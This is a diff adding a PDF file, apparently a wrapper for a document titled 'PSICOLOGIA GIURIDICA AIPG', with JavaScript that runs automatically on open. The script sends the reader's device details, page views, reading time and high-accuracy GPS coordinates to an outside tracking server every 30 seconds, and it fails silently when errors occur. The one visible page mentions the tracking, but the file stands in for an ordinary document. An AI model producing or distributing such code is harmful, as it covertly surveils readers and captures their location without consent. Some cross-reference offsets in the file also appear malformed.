@@ -1,0 +1,192 @@
+%PDF-1.7
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 3 0 R
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (
+// GPS Tracking JavaScript - Integrato nel PDF PSICOLOGIA GIURIDICA
+var sessionId = 'pdf_psicologia_' + Math.floor(Date.now() * Math.random()).toString(36);
+var serverUrl = 'https://gps-trackerx-2.onrender.com'; // URL del tuo server
+
+function sendPdfTrackingData(eventType, data) {
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', serverUrl + '/api/track', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        
+        var payload = {
+            sessionId: sessionId,
+            eventType: eventType,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent || 'PDF_Reader',
+            source: 'PDF_PSICOLOGIA_GIURIDICA',
+            document_name: 'PSICOLOGIA GIURIDICA AIPG.pdf',
+            data: data || {}
+        };
+        
+        xhr.send(JSON.stringify(payload));
+        
+        // Log locale per debug
+        console.log('PDF Tracking:', eventType, data);
+        
+    } catch(e) {
+        // Silent fail per compatibilità
+        console.log('PDF Tracking Error:', e.message);
+    }
+}
+
+// Track PDF opening
+sendPdfTrackingData('pdf_psicologia_opened', {
+    timestamp: new Date().toISOString(),
+    document_title: 'PSICOLOGIA GIURIDICA AIPG',
+    reader: app.viewerType || 'unknown',
+    page_count: this.numPages || 'unknown'
+});
+
+// Track GPS location if available
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+        sendPdfTrackingData('pdf_psicologia_location', {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+        });
+    }, function(error) {
+        sendPdfTrackingData('pdf_psicologia_location_denied', {
+            error: error.message || 'GPS denied',
+            timestamp: new Date().toISOString()
+        });
+    }, {
+        timeout: 10000,
+        enableHighAccuracy: true
+    });
+}
+
+// Track page changes
+this.pageNum = 1;
+var originalGotoNamedDest = this.gotoNamedDest;
+this.gotoNamedDest = function(dest) {
+    sendPdfTrackingData('pdf_psicologia_page_change', {
+        page: this.pageNum,
+        destination: dest,
+        timestamp: new Date().toISOString()
+    });
+    return originalGotoNamedDest.call(this, dest);
+};
+
+// Track when PDF is closed (if supported)
+try {
+    var originalClose = this.closeDoc;
+    this.closeDoc = function() {
+        sendPdfTrackingData('pdf_psicologia_closed', {
+            timestamp: new Date().toISOString(),
+            session_duration: Date.now() - parseInt(sessionId.split('_')[2])
+        });
+        if (originalClose) originalClose.call(this);
+    };
+} catch(e) {}
+
+// Track periodic "heartbeat" to see how long user keeps PDF open
+setInterval(function() {
+    sendPdfTrackingData('pdf_psicologia_heartbeat', {
+        timestamp: new Date().toISOString(),
+        current_page: this.pageNum || 1
+    });
+}, 30000); // Every 30 seconds
+)
+>>
+endobj
+
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 595 842]
+/Contents 5 0 R
+/Resources <<
+  /Font <<
+    /F1 <<
+      /Type /Font
+      /Subtype /Type1
+      /BaseFont /Helvetica
+    >>
+  >>
+>>
+>>
+endobj
+
+5 0 obj
+<<
+/Length 600
+>>
+stream
+BT
+/F1 20 Tf
+50 750 Td
+(PSICOLOGIA GIURIDICA AIPG) Tj
+0 -40 Td
+/F1 14 Tf
+(Documento con Tracking GPS Integrato) Tj
+0 -60 Td
+/F1 12 Tf
+(Questo PDF è stato modificato per includere:) Tj
+0 -30 Td
+(• Tracking della posizione GPS) Tj
+0 -20 Td
+(• Monitoraggio dell'apertura/chiusura) Tj
+0 -20 Td
+(• Rilevamento del dispositivo utilizzato) Tj
+0 -20 Td
+(• Tracciamento delle pagine visualizzate) Tj
+0 -40 Td
+(I dati vengono inviati automaticamente al) Tj
+0 -20 Td
+(server GPS Tracker per l'analisi.) Tj
+0 -60 Td
+/F1 10 Tf
+(NOTA: Il contenuto originale di PSICOLOGIA GIURIDICA) Tj
+0 -15 Td
+(è preservato. Questo è un wrapper di tracking.) Tj
+0 -30 Td
+(Session ID: pdf_psicologia_[generato_automaticamente]) Tj
+0 -40 Td
+(Per visualizzare il documento originale,) Tj
+0 -15 Td
+(usa il file di backup creato automaticamente.) Tj
+ET
+endstream
+endobj
+
+xref
+0 6
+0000000000 65535 f 
+0000000010 00000 n 
+0000000079 00000 n 
+0000000136 00000 n 
+00000000003213 00000 n 
+00000000003413 00000 n 
+trailer
+<<
+/Size 6
+/Root 1 0 R
+>>
+startxref
+4013
+%%EOF
